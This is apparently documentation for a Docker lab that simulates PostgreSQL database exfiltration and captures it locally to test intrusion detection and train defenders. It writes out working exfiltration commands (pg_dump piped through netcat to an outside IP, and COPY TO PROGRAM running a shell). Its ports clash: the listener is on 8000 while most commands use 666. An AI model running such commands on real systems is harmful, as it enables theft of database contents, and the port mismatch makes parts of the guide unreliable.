# Data Exfiltration Simulation

## Overview

This document describes the data exfiltration simulation setup in the Trident lab environment. The setup simulates realistic database exfiltration to a "public" IP address while actually capturing the data locally for analysis.

## Infrastructure

### Network Topology

```
┌─────────────────────────────────────────────────────────────┐
│                         Host Machine                         │
│  ┌──────────────┐        ┌──────────────┐                  │
│  │   Server     │        │   Router     │                  │
│  │ 172.31.0.10  │────────│ 172.31.0.1   │                  │
│  │              │   B    │              │                  │
│  │  lab_net_b   │────────│ 172.30.0.1   │                  │
│  └──────────────┘        └──────────────┘                  │
│                                  │                          │
│                            (NAT/DNAT)                      │
│                                  │                          │
│                        137.184.126.86:8000                  │
│                        (Fake Public IP)                    │
└─────────────────────────────────────────────────────────────┘
```

### Components

1. **Server** (`lab_server` - 172.31.0.10)
   - Runs PostgreSQL database (port 5432)
   - Contains the target database `labdb`
   - Routes exfiltration traffic through router
   - Location: `images/server/`

2. **Router** (`lab_router` - 172.31.0.1)
   - Forwards traffic between networks
   - Applies DNAT rule to redirect "public" IP traffic locally
   - Runs netcat listener on port 8000
   - Captures all traffic in PCAP files
   - Location: `images/router/`

### IP Addresses

| Component | IP Address | Network | Purpose |
|-----------|-----------|---------|---------|
| lab_server | 172.31.0.10 | lab_net_b | Target database server |
| lab_router | 172.31.0.1 / 172.30.0.1 | lab_net_b / lab_net_a | Router & DNAT endpoint |
| Fake Public IP | 137.184.126.86 | N/A | Simulated external attacker IP |

## How It Works

### 1. Route Configuration (Server)

On the server, traffic destined for `137.184.126.86` is routed through the router:

```bash
ip route add 137.184.126.86 via 172.31.0.1 dev eth0
```

This ensures that any attempt to connect to the "public" IP goes through the router.

### 2. DNAT Rule (Router)

On the router, a DNAT (Destination NAT) rule redirects traffic:

```bash
iptables-legacy -t nat -A PREROUTING -d 137.184.126.86 -p tcp --dport 8000 \
  -j DNAT --to-destination 172.31.0.1:8000
```

This rule:
- Captures packets destined for `137.184.126.86:8000`
- Rewrites the destination to `172.31.0.1:8000` (the router itself)
- Preserves the original destination in PCAP captures

### 3. Netcat Listener (Router)

The router runs a netcat listener to receive the data:

```bash
nc -lvnp 8000 > /tmp/exfil/labdb_dump.sql
```

### 4. Traffic Flow

```
1. Server: pg_dump labdb | nc 137.184.126.86 666
   ↓
2. Server routing table: Send to 172.31.0.1 (router)
   ↓
3. Router DNAT: 137.184.126.86 → 172.31.0.1
   ↓
4. Router netcat listener: Receives and saves data
   ↓
5. Router PCAP: Captures traffic with dest=137.184.126.86
```

## Exfiltration Commands

### Method 1: Direct pg_dump with netcat

```bash
docker exec lab_server su - postgres -c \
  'pg_dump -U postgres labdb | nc -w 10 137.184.126.86 666'
```

### Method 2: PostgreSQL COPY with PROGRAM

```bash
docker exec lab_server su - postgres -c \
  'psql -c "COPY (SELECT 1) TO PROGRAM \
    '\''sh -c \"pg_dump -U postgres labdb | nc 137.184.126.86 666\"'\'';"'
```

### Method 3: Manual connection from server

```bash
docker exec lab_server su - postgres -c \
  'pg_dump -U postgres labdb > /tmp/dump.sql'
docker exec lab_server su - postgres -c \
  'nc 137.184.126.86 666 < /tmp/dump.sql'
```

## Retrieving Exfiltrated Data

### From Router Container

```bash
# View file size
docker exec lab_router ls -lh /tmp/exfil/labdb_dump.sql

# Copy to host machine
docker cp lab_router:/tmp/exfil/labdb_dump.sql ./labdb_dump.sql

# Clean the dump (remove netcat headers)
docker exec lab_router bash -c \
  "tail -n +4 /tmp/exfil/labdb_dump.sql > /tmp/exfil/labdb_clean.sql"
docker cp lab_router:/tmp/exfil/labdb_clean.sql ./labdb_clean.sql
```

### From Host After Copy

```bash
# View first lines
head -50 labdb_clean.sql

# Restore to PostgreSQL (if needed)
psql -h localhost -U postgres -d labdb < labdb_clean.sql
```

## PCAP Analysis

The router captures all traffic in `/outputs/<RUN_ID>/pcaps/`. The PCAP files will show:

- **Source**: `172.31.0.10` (server)
- **Destination**: `137.184.126.86:8000` (fake public IP)
- **Protocol**: TCP
- **Content**: PostgreSQL database dump

### Analyzing with tcpdump

```bash
# View exfiltration traffic
tcpdump -r /outputs/<RUN_ID>/pcaps/router_*.pcap \
  -A 'host 137.184.126.86 and port 8000'

# View connection establishment
tcpdump -r /outputs/<RUN_ID>/pcaps/router_*.pcap \
  'host 137.184.126.86 and port 8000'

# Count packets to exfil IP
tcpdump -r /outputs/<RUN_ID>/pcaps/router_*.pcap \
  -c 10 'dst host 137.184.126.86'
```

### Analyzing with Wireshark

1. Open the PCAP file in Wireshark
2. Filter: `ip.dst == 137.184.126.86 && tcp.port == 666`
3. Follow TCP stream to see the database dump

## Automatic Setup

The exfiltration simulation is automatically configured on `make up`:

### Server Configuration (`images/server/entrypoint.sh`)

```bash
# Add route for simulated exfiltration IP
ip route add 137.184.126.86 via 172.31.0.1 dev eth0 2>/dev/null || true
```

### Router Configuration (`images/router/entrypoint.sh`)

```bash
# Setup DNAT rule
iptables-legacy -t nat -A PREROUTING -d 137.184.126.86 -p tcp --dport 8000 \
  -j DNAT --to-destination 172.31.0.1:8000 2>/dev/null || true

# Start netcat listener
mkdir -p /tmp/exfil
nc -lvnp 8000 > /tmp/exfil/labdb_dump.sql 2>/tmp/exfil/nc.log &
```

## Verification

### Verify Route on Server

```bash
docker exec lab_server ip route show | grep 137.184.126.86
# Expected output: 137.184.126.86 via 172.31.0.1 dev eth0
```

### Verify DNAT Rule on Router

```bash
docker exec lab_router iptables-legacy -t nat -L PREROUTING -n -v | grep 137.184.126.86
# Expected output: DNAT tcp -- * * 0.0.0.0/0 137.184.126.86 tcp dpt:8000 to:172.31.0.1:8000
```

### Verify Listener on Router

```bash
docker exec lab_router ss -tlnp | grep 8000
# Expected output: LISTEN 0 1 0.0.0.0:8000 0.0.0.0:* users:(("nc",pid=XXX,fd=3))
```

### Test Connection

```bash
docker exec lab_server timeout 3 nc -zv 137.184.126.86 666
# Expected output: Connection to 137.184.126.86 666 port [tcp/*] succeeded!
```

## Security Use Cases

This setup simulates realistic data exfiltration scenarios for:

1. **IDS/IPS Testing**: Verify detection rules catch data exfiltration
2. **Defender Training**: Practice detecting and responding to database theft
3. **PCAP Analysis**: Analyze network traffic patterns of exfiltration
4. **SLIPS Evaluation**: Test behavioral anomaly detection

## Customization

### Changing the Fake Public IP

To use a different fake IP, update these files:

1. `images/server/entrypoint.sh`: Route configuration
2. `images/router/entrypoint.sh`: DNAT rule and listener message

Then rebuild:

```bash
make down
make up
```

### Changing the Port

To use a different port (e.g., 443 for HTTPS simulation):

1. Update port in `images/router/entrypoint.sh` (DNAT rule and listener)
2. Update documentation
3. Rebuild: `make down && make up`

## Troubleshooting

### Connection Refused

**Problem**: `nc: connect to 137.184.126.86 port 8000 (tcp) failed: Connection refused`

**Solution**:
- Verify listener is running: `docker exec lab_router ss -tlnp | grep 8000`
- Check DNAT rule: `docker exec lab_router iptables-legacy -t nat -L PREROUTING -n -v`
- Verify route: `docker exec lab_server ip route show | grep 137.184.126.86`

### No Data Received

**Problem**: Connection succeeds but no data transferred

**Solution**:
- Check netcat log: `docker exec lab_router cat /tmp/exfil/nc.log`
- Verify pg_dump works: `docker exec lab_server su - postgres -c 'pg_dump -U postgres labdb > /dev/null'`
- Try simpler test: `docker exec lab_server sh -c 'echo "test" | nc 137.184.126.86 666'`

### PCAP Shows Wrong IP

**Problem**: PCAP shows 172.31.0.1 instead of 137.184.126.86

**Solution**:
- Verify DNAT rule is in PREROUTING chain, not POSTROUTING
- Check rule order: DNAT must come before any other NAT rules
- Use `iptables-legacy` (not nftables) for compatibility

## References

- PostgreSQL `COPY ... TO PROGRAM`: https://www.postgresql.org/docs/11/sql-copy.html
- iptables DNAT: https://linux.die.net/man/8/iptables
- tcpdump: https://www.tcpdump.org/
